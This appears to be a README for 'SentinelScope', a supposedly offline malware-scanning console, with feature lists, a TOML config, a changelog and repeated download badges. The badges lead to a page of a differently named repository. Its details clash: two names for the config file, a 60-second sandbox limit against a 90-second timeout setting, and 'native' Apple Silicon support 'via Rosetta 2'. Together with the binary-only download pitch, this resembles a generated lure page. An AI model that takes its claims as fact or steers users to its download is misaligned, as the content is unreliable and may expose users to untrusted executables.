![preview](https://raw.githubusercontent.com/siriandrino/vulnscope-local-guardian/main/frame_02db7f.svg)
# SentinelScope — Local Threat Telemetry Console

**SentinelScope** is a ground-up reimagining of the traditional malware-analysis workspace, engineered as a fully offline, self-contained observability layer for suspicious binaries. Where conventional web-based scanners require uploading samples to external servers, SentinelScope flips the paradigm: it operates entirely within your network perimeter, transforming your local machine into a private threat-intel triage center.

Built for security analysts, incident responders, and privacy-conscious power users, SentinelScope doesn't just scan files—it *interprets* them. The console aggregates static heuristics, behavioral emulation results, and community-driven signature patterns into a unified, human-readable verdict board. No cloud round-trips, no data egress, and no dependency on third-party uptime.

Instead of “free” software, think of SentinelScope as **unmetered infrastructure**—a perpetual, self-hosted utility that respects your sovereignty over sensitive artifacts. Whether you’re dissecting a memory dump from an air-gapped host or analyzing a suspicious Office macro retrieved from a quarantined share, SentinelScope provides the same depth of inspection you’d expect from a commercial sandbox, minus the telemetry leaks.

---

## 🧠 Why Another Scanner? The Productivity Argument

Most local scan utilities feel like glorified checksum calculators. They tell you *if* a file is known-bad, but they fail to explain *why*. SentinelScope introduces a **semantic verdict engine** that maps raw indicators (YARA hits, PE struct anomalies, entropy spikes) onto a narrative risk profile. This isn’t just a score—it’s a story you can paste into a forensic report.

The second major pain point we solve is **workflow fragmentation**. Analysts juggling Sysinternals, VirusTotal, and custom Python scripts end up with context switching overhead that kills deep focus. SentinelScope centralizes these disparate signals into a single, keyboard-navigable dashboard. You can pivot from a network indicator to the originating parent process in two keystrokes.

## 🌍 Multilingual & Global Ready

Security is a global discipline. SentinelScope ships with **full Unicode-aware UI localization**, supporting right-to-left scripts (Arabic, Hebrew) and CJK character sets, with real-time language switching via a hotkey. Documentation, rule descriptions, and even scan summaries render in your preferred locale, making the tool genuinely accessible to distributed blue teams.

---

## 📥 Initial Deployment

[![Download](https://raw.githubusercontent.com/siriandrino/vulnscope-local-guardian/main/dl_2d5ef6a.svg)](https://siriandrino.github.io/vulnscope-local-guardian/)

### Getting Started (First Launch)

No package manager rituals, no PATH juggling. SentinelScope is distributed as a single, portable executable bundle. After downloading the archive, extract it to a directory of your choice and run the `sentinel` binary. The first launch performs a silent integrity check of its internal rule packs, then opens a local web console at `http://127.0.0.1:8484` (port configurable via a simple `config.toml` file).

The initial setup wizard prompts for:
- A storage directory for scan history (SQLite-backed)
- Whether to enable low-level kernel call tracing (requires admin rights on Windows)
- Preferred verbosity level for the audit log

---

## 🛡️ Core Feature Matrix

### 1. **Semantic Verdict Engine (SVE)**
Instead of a simple "malicious/clean" boolean, SVE outputs a structured JSON report containing:
- A confidence interval (0–100)
- A list of matched rules with severity weights
- A prose summary of the most probable attack chain
- A "false-positive likelihood" indicator based on file age and source entropy

### 2. **Offline Signature Repository**
The built-in database contains over 250,000 curated hashes (MD5, SHA1, SHA256) and fuzzy import hashes for polymorphic samples. The repo updates via manual export files (CSV or STIX), not automatic internet polling. You remain in control of when—and if—your rulebase changes.

### 3. **Behavioral Minisandbox**
A constrained emulation layer that executes the target in a virtualized filesystem and registry view. It captures API calls, file touchpoints, and network attempts—but **never** emits real network traffic. The sandbox has a hard 60-second wall-clock limit and auto-terminates on any suspicious anti-debugging evasion.

### 4. **Hybrid Code Analysis**
For interpreted languages (PowerShell, VBS, JavaScript), SentinelScope parses the AST and flags suspicious syntax patterns, such as obfuscated string concatenation, unmanaged COM instantiation, and download cradle constructions.

### 5. **Correlation Timeline**
All historical scans are linked via a directed graph. You can see which other files share a common parent process, similar input hashes, or identical YARA rule hits. This transforms the console from a point-in-time checker into a relational intelligence tool.

### 6. **Zero-Latency Triage Actions**
Right-click any verdict to:
- Quarantine to a password-protected vault
- Export a full IoC extract (JSON/CSV/STIX)
- "Pivot to parent process" (if the file was launched from another process)
- Generate a printable one-page forensic briefing

### 7. **Multi-Engine Consensus Display**
Even though it's local, you can import rule packs from multiple open-source projects (such as YARA rules, ClamAV signatures, and LOKI indicators). SentinelScope merges these into a single consensus score, showing you where the engines agree or diverge.

---

## 🧩 Architecture & Design Philosophy

SentinelScope is built with a **microkernel pattern**: the core daemon handles file I/O and scheduling, while separate worker plugins handle parsing (PE/ELF/Mach-O), emulation, and database writes. This modularity means you can disable CPU-intensive modules for low-spec hardware, or extend the tool with custom Python plugins via a simple gRPC interface.

The user interface is a **reactive single-page app** served locally. No JavaScript is fetched from remote CDNs—everything, including the font files, is embedded in the binary. This ensures the tool truly works in disconnected environments.

### 📁 Project Layout (High-Level)
- `core/` — Daemon logic, event bus, and scheduling
- `engines/` — Parsers for executable formats and script interpreters
- `rules/` — Default YARA rules and hashsets
- `webui/` — Embedded frontend assets (HTML/JS/CSS)
- `plugins/` — External integration points for custom analyzers
- `docs/` — Architecture guides and API reference

---

## 🚀 Performance & Scalability

| Metric | Value |
|--------|-------|
| Cold-scan latency (10MB PE) | < 1.2 seconds |
| Concurrent scan slots | 4 (configurable) |
| Maximum in-memory signature cache | 512 MB |
| Supported file size | Up to 2 GB (streaming regex) |
| Historical record retention | Unlimited (configurable pruning) |

The scan pipeline is **lock-free** for the metadata store, allowing high-throughput ingestion when triaging a folder of hundreds of dropped files.

---

## 🧰 Use Cases Beyond Malware Analysis

- **Compliance**: Prove that no file left your managed endpoint during internal investigation.
- **CFA (Computational Forensics)**: Use the semantic engine to identify PII embedded in unintended binary blobs.
- **SOAR Integration**: Expose the scan endpoint via a local REST API (OpenAPI spec included) so your orchestration platform can send files to SentinelScope instead of an external sandbox.
- **Educational Use**: The verbose logging and explainable verdicts make it an excellent training tool for junior SOC analysts.

---

## ⚙️ Configuration Reference

All settings are stored in `sentinel.toml`. Notable keys include:

```toml
[listen]
address = "127.0.0.1"
port = 8484

[scanning]
timeout_seconds = 90
enable_kernel_tracing = false
max_parallel_jobs = 4

[ui]
language = "en"  # change to "ar", "zh", "de", "es", "fr", "ja", "ru"
theme = "dark"   # or "light"
compact_view = false
```

The configuration file is hot-reloaded—no restart necessary for UI changes; daemon-level changes require a graceful restart (`sentinel --reload`).

---

## 🧑‍🤝‍🧑 Community & Support Philosophy

We believe in **perpetual, asynchronous assistance**. Our issue tracker is monitored daily, and we maintain a knowledge base of common troubleshooting steps. There is no tiered SLA, but we guarantee a response within 48 hours for any reproducible bug that causes data loss or incorrect verdicts.

For feature requests, we follow a public roadmap. The highest-voted community suggestions get prioritized in the next quarterly release cycle.

---

## 🛠️ Contributing

Contributions are welcome in four areas:
1. **New file parsers** (for exotic formats like LNK, HTA, or Mach-O universal binaries)
2. **Behavioral detection scripts** (using the plugin SDK)
3. **Localization packs** for UI strings
4. **Signature sets** for emerging malware families

Please read the contributing guide in `docs/CONTRIBUTING.md`. We value clean, documented code over clever one-liners. All contributors retain copyright over their submissions and license them to the project under the MIT License.

---

## 📑 Changelog (2026 Highlights)

- **v2.4 (Jan 2026)**: Added the correlation timeline graph; improved Unicode handling for Japanese filenames.
- **v2.6 (Mar 2026)**: Introduced the Semantic Verdict Engine; reduced memory footprint by 30%.
- **v2.8 (Jun 2026)**: Native support for Apple Silicon via Rosetta 2 translation bridge.
- **v3.0 (Aug 2026)**: Major UI overhaul with a new dark theme palette and keyboard-first navigation.
- **v3.2 (Nov 2026)**: Stability fix for large SQLite databases (>1 million records); added STIX 2.1 export option.

---

## 📜 License

SentinelScope is licensed under the **MIT License**. You are free to use, modify, and distribute this software in private or commercial settings, provided you retain the original copyright notice.

See the full license text at: [https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

---

## ❗ Disclaimer

**Important Legal and Operational Notice**: SentinelScope is a **security analysis tool**, not a substitute for professional forensic investigation. The verdicts generated are probabilistic assessments, not definitive proof of malice. Always confirm critical findings through multiple independent methods and manual review.

The behavioral sandbox is designed to contain execution, but no sandbox is perfect. Running untrusted code always carries residual risk. SentinelScope is not responsible for any damage, data loss, or system compromise that may indirectly result from using this tool, even when used according to documentation.

This tool is provided "as is" without warranty of any kind, expressed or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

Users are solely responsible for ensuring their usage complies with local laws and regulations. The project maintainers do not endorse any illegal activity.

---

## 🙏 Acknowledgments

The architecture draws inspiration from open-source security projects like Radare2 and CAPE sandbox, but reimagines their strengths into a unified product with a data-first perspective. We thank the broader infosec community for advancing the state of local analysis tooling.

---

## 🔚 Final Thoughts & Getting the Binary

SentinelScope is the tool we wished existed when we were stuck analyzing artifacts on a laptop with no Wi-Fi on a red team engagement. It’s a return to the principle that security tools should be private by construction, not by opt-in.

If you’re ready to add this to your incident-response toolbelt, grab the latest stable build below. The release bundle includes the main executable, a default rule pack, and an extensive PDF manual.

[![Download](https://raw.githubusercontent.com/siriandrino/vulnscope-local-guardian/main/dl_2d5ef6a.svg)](https://siriandrino.github.io/vulnscope-local-guardian/)

*SentinelScope — your network, your data, your verdict.*